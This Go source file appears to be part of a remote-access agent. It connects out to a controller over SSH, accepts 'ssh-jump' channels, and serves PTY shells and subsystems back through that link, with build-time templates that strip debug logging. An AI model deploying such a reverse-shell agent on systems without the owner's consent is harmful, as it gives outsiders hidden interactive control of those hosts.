package sshd

import (
	"agent/internal/sshd/subsystems"
	"encoding/binary"
	"fmt"
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}
	"net"

	"github.com/google/shlex"
	"golang.org/x/crypto/ssh"
)

type ptyReq struct {
	Term          string
	Columns, Rows uint32
	Width, Height uint32
	Modes         string
}

func HandleSSHConnection(conn net.Conn, address string, sshClientConfig *ssh.ClientConfig, sshServerConfig *ssh.ServerConfig) error {
	sshConn, chans, reqs, err := ssh.NewClientConn(conn, address, sshClientConfig)
	if err != nil {
		return fmt.Errorf("new SSH connection: %w", err)
	}
	defer sshConn.Close()

	// {{if .Debug}}
	log.Printf("Connected to %s", address)
	// {{end}}

	// Ignore requests
	go ssh.DiscardRequests(reqs)

	// Handle channels
	for newChannel := range chans {
		// {{if .Debug}}
		log.Printf("New client channel: %s", newChannel.ChannelType())
		// {{end}}
		switch newChannel.ChannelType() {
		case "ssh-jump":
			channel, request, err := newChannel.Accept()
			if err != nil {
				// {{if .Debug}}
				log.Printf("Failed to accept channel: %v", err)
				// {{end}}
				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
				continue
			}
			go handleJump(channel, request, sshServerConfig)
		default:
			// {{if .Debug}}
			log.Printf("Unknown channel type: %s", newChannel.ChannelType())
			// {{end}}
			newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
		}
	}

	return nil
}

func handleJump(channel ssh.Channel, _ <-chan *ssh.Request, sshServerConfig *ssh.ServerConfig) {
	// {{if .Debug}}
	log.Printf("Jump channel accepted")
	// {{end}}

	pAgent, pServer := net.Pipe()
	defer pAgent.Close()
	defer pServer.Close()

	go func() {
		_, err := io.Copy(channel, pServer)
		if err != nil {
			// {{if .Debug}}
			log.Printf("io channel<-pServer error: %v", err)
			// {{end}}
		}
	}()
	go func() {
		_, err := io.Copy(pServer, channel)
		if err != nil {
			// {{if .Debug}}
			log.Printf("io pServer<-channel error: %v", err)
			// {{end}}
		}
	}()

	sshConn, chans, reqs, err := ssh.NewServerConn(pAgent, sshServerConfig)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to create SSH connection: %v", err)
		// {{end}}
		return
	}
	defer sshConn.Close()

	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		// {{if .Debug}}
		log.Printf("New server channel: %s", newChannel.ChannelType())
		// {{end}}
		switch newChannel.ChannelType() {
		case "session":
			channel, request, err := newChannel.Accept()
			if err != nil {
				// {{if .Debug}}
				log.Printf("Failed to accept channel: %v", err)
				// {{end}}
				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
				continue
			}
			go handleSession(channel, request)
		default:
			// {{if .Debug}}
			log.Printf("Unknown channel type: %s", newChannel.ChannelType())
			// {{end}}
			newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
		}
	}
}

func handleSession(channel ssh.Channel, request <-chan *ssh.Request) {
	defer channel.Close()

	var isPty bool
	var shell = NewShell()
	for req := range request {
		// {{if .Debug}}
		log.Printf("Session request: %s", req.Type)
		// {{end}}
		switch req.Type {
		case "pty-req":
			isPty = true
			p, err := parsePtyReq(req)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Failed to parse pty request: %v", err)
				// {{end}}
				req.Reply(false, nil)
				continue
			}
			// {{if .Debug}}
			log.Printf("PTY request: %s - %dx%d (%dx%d)", p.Term, p.Width, p.Height, p.Columns, p.Rows)
			// {{end}}
			shell.SetSize(int(p.Width), int(p.Height))
			req.Reply(true, nil)
		case "window-change":
			if len(req.Payload) < 8 {
				// {{if .Debug}}
				log.Printf("Window change request received with invalid payload")
				// {{end}}
				req.Reply(true, nil)
				continue
			}
			width, height := parseWindowChangeReq(req.Payload)
			// {{if .Debug}}
			log.Printf("Window change request: %dx%d", width, height)
			// {{end}}
			shell.SetSize(int(width), int(height))
			req.Reply(true, nil)
		case "shell":
			if isPty {
				go shell.handleShell(channel)
				req.Reply(true, nil)
			} else {
				// {{if .Debug}}
				log.Printf("Shell request received before PTY request")
				// {{end}}
				channel.Write([]byte("Only PTY requests are supported.\n"))
				req.Reply(true, nil)
				return
			}
		case "subsystem":
			// {{if .Debug}}
			log.Printf("Subsystem request received: %v", req.Payload)
			// {{end}}
			line := string(req.Payload[4:])

			args, err := shlex.Split(line)
			if err != nil && len(args) > 0 {
				// {{if .Debug}}
				log.Printf("Failed to parse subsystem command: %v", err)
				// {{end}}
				channel.Write([]byte(fmt.Sprintf("Failed to parse subsystem command: %v\n", err)))
				req.Reply(true, nil)
				continue
			}

			system := args[0]
			systemArgs := []string{}
			if len(args) > 1 {
				systemArgs = args[1:]
			}
			if subsystemFunc, ok := subsystems.Subsystems[system]; ok {
				// {{if .Debug}}
				log.Printf("Subsystem function found: %s", system)
				// {{end}}
				go subsystemFunc(channel, systemArgs)
				req.Reply(true, nil)
			} else {
				// {{if .Debug}}
				log.Printf("Subsystem not supported: %s", system)
				// {{end}}
				channel.Write([]byte(fmt.Sprintf("Subsystem not supported: %s\n", system)))
				req.Reply(true, nil)
				return
			}
		default:
			// {{if .Debug}}
			log.Printf("Unknown request: %v", req.Type)
			channel.Write([]byte(fmt.Sprintf("Unknown request: %s\n", req.Type)))
			// {{end}}
			req.Reply(true, nil)
		}
	}
}

func parsePtyReq(req *ssh.Request) (*ptyReq, error) {
	var data ptyReq
	if err := ssh.Unmarshal(req.Payload, &data); err != nil {
		return nil, err
	}
	return &data, nil
}

func parseWindowChangeReq(req []byte) (uint32, uint32) {
	width := binary.BigEndian.Uint32(req)
	height := binary.BigEndian.Uint32(req[4:])
	return width, height
}
